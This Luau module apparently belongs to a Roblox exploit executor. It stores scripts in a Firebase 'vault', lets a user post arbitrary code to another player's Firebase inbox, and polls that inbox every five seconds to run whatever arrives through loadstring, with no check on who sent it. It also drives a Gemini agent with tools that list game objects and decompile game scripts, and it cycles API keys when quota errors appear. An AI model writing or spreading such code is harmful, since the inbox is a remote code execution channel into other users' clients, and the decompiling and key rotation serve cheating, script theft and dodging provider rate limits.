local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

local Core = {
    Config = {
        FirebaseURL = "https://luauaicodes-default-rtdb.firebaseio.com/",
        ApiKeys = {},
        CurrentKeyIndex = 1,
        CurrentModel = "gemini-3.1-pro", 
        VaultID = "",
        AgenticEnabled = false
    }
}

-- [ FIREBASE & DB FUNCTIONS ]
function Core:RequestDB(endpoint, method, body)
    if not httpRequest then return nil end
    local url = self.Config.FirebaseURL .. endpoint .. ".json"
    local response = nil
    
    pcall(function()
        local params = {Url = url, Method = method}
        if body then
            params.Headers = {["Content-Type"] = "application/json"}
            params.Body = HttpService:JSONEncode(body)
        end
        response = httpRequest(params)
    end)
    
    if response and response.StatusCode == 200 then
        return HttpService:JSONDecode(response.Body)
    end
    return nil
end

-- [ VAULT FUNCTIONS ]
function Core:LoadVault(vaultId)
    self.Config.VaultID = vaultId
    local data = self:RequestDB("cofres/" .. vaultId .. "/scripts", "GET")
    return data or {}
end

function Core:SaveToVault(name, content)
    if self.Config.VaultID == "" then return false end
    local url = self.Config.FirebaseURL .. "cofres/" .. self.Config.VaultID .. "/scripts.json"
    local success = pcall(function()
        httpRequest({
            Url = url, 
            Method = "POST", 
            Body = HttpService:JSONEncode({
                nome = name, 
                conteudo = content, 
                data = os.date("%d/%m/%Y"), 
                author = tostring(LocalPlayer.UserId)
            })
        })
    end)
    return success
end

function Core:DeleteFromVault(scriptId)
    if self.Config.VaultID == "" then return false end
    local url = self.Config.FirebaseURL .. "cofres/" .. self.Config.VaultID .. "/scripts/" .. scriptId .. ".json"
    return pcall(function() httpRequest({Url = url, Method = "DELETE"}) end)
end

-- [ NEXUS FUNCTIONS ]
function Core:SendCommand(targetId, type, payload)
    local data = {type = type, sender = LocalPlayer.Name, timestamp = os.time()}
    if type == "EXECUTE" then data.code = payload end
    task.spawn(function() self:RequestDB("usuarios/" .. targetId .. "/inbox", "POST", data) end)
end

function Core:StartInboxListener()
    task.spawn(function()
        while task.wait(5) do
            local inbox = self:RequestDB("usuarios/" .. tostring(LocalPlayer.UserId) .. "/inbox", "GET")
            if inbox then
                for key, cmd in pairs(inbox) do
                    pcall(function()
                        if cmd.type == "EXECUTE" then
                            local func = loadstring or load
                            if func then 
                                local c = func(cmd.code)
                                if c then task.spawn(c) end
                            end
                        end
                    end)
                    self:RequestDB("usuarios/" .. tostring(LocalPlayer.UserId) .. "/inbox/" .. key, "DELETE")
                end
            end
        end
    end)
end

-- [ GEMINI AGENTIC FUNCTIONS ]
function Core:AddApiKey(key)
    if key and key ~= "" then
        table.insert(self.Config.ApiKeys, key)
    end
end

function Core:GetCurrentApiKey()
    if #self.Config.ApiKeys == 0 then return nil end
    return self.Config.ApiKeys[self.Config.CurrentKeyIndex]
end

function Core:NextApiKey()
    if #self.Config.ApiKeys <= 1 then return end
    self.Config.CurrentKeyIndex = self.Config.CurrentKeyIndex + 1
    if self.Config.CurrentKeyIndex > #self.Config.ApiKeys then
        self.Config.CurrentKeyIndex = 1
    end
end

-- Ferramentas disponíveis para a IA
local AgentTools = {
    {
        name = "get_children",
        description = "Gets the names of the children of an object in the game.",
        parameters = {
            type = "OBJECT",
            properties = {
                path = {
                    type = "STRING",
                    description = "Path to the object (e.g. 'game.ReplicatedStorage')"
                }
            },
            required = {"path"}
        }
    },
    {
        name = "get_script_source",
        description = "Reads the source code of a LocalScript or ModuleScript in the game. Only works if your exploit supports getscripts/decompile or reading .Source.",
        parameters = {
            type = "OBJECT",
            properties = {
                path = {
                    type = "STRING",
                    description = "Path to the script object"
                }
            },
            required = {"path"}
        }
    }
}

-- Resolve um caminho em string para o objeto real do jogo
local function ResolvePath(pathStr)
    local parts = string.split(pathStr, ".")
    local current = game
    if parts[1] == "game" then table.remove(parts, 1) end
    if parts[1] == "workspace" or parts[1] == "Workspace" then current = workspace table.remove(parts, 1) end
    
    for _, part in ipairs(parts) do
        local nextObj = current:FindFirstChild(part)
        if not nextObj then return nil end
        current = nextObj
    end
    return current
end

function Core:ExecuteTool(toolName, args)
    if not self.Config.AgenticEnabled then
        return "Agentic mode is disabled by the user."
    end
    
    if toolName == "get_children" then
        local obj = ResolvePath(args.path)
        if obj then
            local res = {}
            for _, child in ipairs(obj:GetChildren()) do
                table.insert(res, child.Name .. " (" .. child.ClassName .. ")")
            end
            if #res == 0 then return "Folder is empty." end
            return table.concat(res, ", ")
        else
            return "Object not found."
        end
    elseif toolName == "get_script_source" then
        local obj = ResolvePath(args.path)
        if obj and (obj:IsA("LocalScript") or obj:IsA("ModuleScript")) then
            local success, src = pcall(function() return decompile and decompile(obj) or obj.Source end)
            if success and src and src ~= "" then
                return src
            else
                return "Could not read source. Executor might not support decompile()."
            end
        else
            return "Script not found or is not a Local/Module script."
        end
    end
    
    return "Tool not found."
end

function Core:SendGeminiPrompt(promptHistory, onUpdate)
    local apiKey = self:GetCurrentApiKey()
    if not apiKey then
        onUpdate("ERRO: Nenhuma API Key configurada.", true)
        return nil
    end

    local model = self.Config.CurrentModel
    local url = "https://generativelanguage.googleapis.com/v1beta/models/" .. model .. ":generateContent?key=" .. apiKey

    local payload = {
        contents = promptHistory,
        generationConfig = { temperature = 0.5 }
    }
    
    if self.Config.AgenticEnabled then
        payload.tools = {{ functionDeclarations = AgentTools }}
    end

    local maxTurns = 5
    local currentTurn = 1

    while currentTurn <= maxTurns do
        local reqData = {
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        }
        
        onUpdate("⏳ Requisitando Gemini API (Turno " .. currentTurn .. ")...", false)
        local success, res = pcall(function() return httpRequest(reqData) end)

        if not success or not res then
            onUpdate("ERRO: Falha ao enviar requisição HTTP.", true)
            return nil
        end

        if res.StatusCode == 429 or res.StatusCode == 403 then
            self:NextApiKey()
            onUpdate("⚠️ API Key esgotada. Mudando para a próxima chave...", false)
            url = "https://generativelanguage.googleapis.com/v1beta/models/" .. model .. ":generateContent?key=" .. self:GetCurrentApiKey()
            task.wait(1)
            continue
        end

        if res.StatusCode ~= 200 then
            onUpdate("ERRO API HTTP " .. tostring(res.StatusCode) .. "\n" .. tostring(res.Body), true)
            return nil
        end

        local data = HttpService:JSONDecode(res.Body)
        if not data.candidates or not data.candidates[1] then
            onUpdate("ERRO: Resposta vazia da IA.", true)
            return nil
        end

        local part = data.candidates[1].content.parts[1]
        
        -- Registra o pensamento da IA
        table.insert(payload.contents, { role = "model", parts = data.candidates[1].content.parts })

        if part.functionCall then
            local fCall = part.functionCall
            onUpdate("🛠️ IA usando ferramenta: " .. fCall.name, false)
            local toolRes = self:ExecuteTool(fCall.name, fCall.args)
            
            -- Retorna resposta da ferramenta
            table.insert(payload.contents, {
                role = "user",
                parts = {{
                    functionResponse = {
                        name = fCall.name,
                        response = { result = toolRes }
                    }
                }}
            })
            currentTurn = currentTurn + 1
        elseif part.text then
            return part.text
        else
            onUpdate("ERRO: Resposta inesperada.", true)
            return nil
        end
    end
    
    onUpdate("ERRO: Limite de turnos agentic atingido.", true)
    return nil
end

return Core
